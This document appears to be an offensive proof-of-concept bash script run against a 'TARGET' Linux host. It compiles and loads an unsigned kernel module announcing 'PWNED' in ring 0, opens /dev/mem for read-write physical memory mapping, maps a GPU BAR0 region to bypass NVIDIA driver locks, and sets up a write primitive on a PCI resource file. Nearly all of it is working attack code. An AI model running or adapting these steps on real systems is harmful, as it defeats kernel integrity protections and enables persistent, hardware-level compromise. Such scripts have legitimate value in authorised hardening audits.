#!/bin/bash
set +e
echo "===== TARGET: $(uname -r) ====="
echo "--- 1. build unsigned module ON TARGET ---"
mkdir -p /tmp/kt && cd /tmp/kt
cat > m.c <<'C'
#include <linux/module.h>
#include <linux/kernel.h>
MODULE_LICENSE("GPL");
static int __init f(void){ pr_info("PWNED: unsigned module executed in ring0\n"); return 0; }
static void __exit g(void){ }
module_init(f); module_exit(g);
C
printf 'obj-m := m.o\n' > Makefile
make -C /lib/modules/$(uname -r)/build M=/tmp/kt modules >/dev/null 2>&1
if [ -f m.ko ]; then
  echo "built: $(ls -l m.ko | awk '{print $5}') bytes"
  modinfo m.ko | grep -iE "^sig_id|^signature|signer" || echo "  NO SIGNATURE (unsigned)"
  sudo insmod m.ko 2>&1 && echo "  *** LOADED ***" || echo "  load failed"
  sudo dmesg | tail -2
  sudo rmmod m
else
  echo "BUILD FAILED"; make -C /lib/modules/$(uname -r)/build M=/tmp/kt modules 2>&1 | tail -5
fi

echo
echo "--- 2. /dev/mem physical write (IO_STRICT_DEVMEM off) ---"
sudo dd if=/dev/zero of=/dev/mem bs=1 count=0 seek=0 2>&1 | tail -1
python3 - <<'P'
import os,mmap
try:
    f=os.open('/dev/mem',os.O_RDWR|os.O_SYNC)
    m=mmap.mmap(f,0x1000,mmap.MAP_SHARED,mmap.PROT_READ|mmap.PROT_WRITE,offset=0)
    print("  /dev/mem RW map at phys 0: OK, first dword = 0x%08X" % int.from_bytes(m[0:4],'little'))
    m.close(); os.close(f); print("  *** physical memory RW accessible ***")
except Exception as e:
    print("  /dev/mem failed:", e)
P

echo
echo "--- 3. GPU BAR0 via /dev/mem at 0xFA000000 ---"
python3 - <<'P'
import os,mmap,struct
try:
    f=os.open('/dev/mem',os.O_RDWR|os.O_SYNC)
    m=mmap.mmap(f,0x1000,mmap.MAP_SHARED,mmap.PROT_READ|mmap.PROT_WRITE,offset=0xFA000000)
    print("  PMC_BOOT_0 = 0x%08X" % struct.unpack_from('<I',m,0)[0])
    print("  *** GPU BAR0 RW via /dev/mem (bypasses nvidia driver locks) ***")
    m.close(); os.close(f)
except Exception as e:
    print("  failed:",e)
P

echo
echo "--- 4. write primitive to resource0 as root (bare metal) ---"
sudo python3 - <<'P'
import os,mmap,struct
p='/sys/bus/pci/devices/0000:03:00.0/resource0'
try:
    f=os.open(p,os.O_RDWR|os.O_SYNC)
    m=mmap.mmap(f,0x1000,mmap.MAP_SHARED,mmap.PROT_READ|mmap.PROT_WRITE)
    print("  resource0 O_RDWR: OK  PMC=0x%08X" % struct.unpack_from('<I',m,0)[0])
    m.close(); os.close(f)
except Exception as e:
    print("  resource0 O_RDWR failed:",e)
P
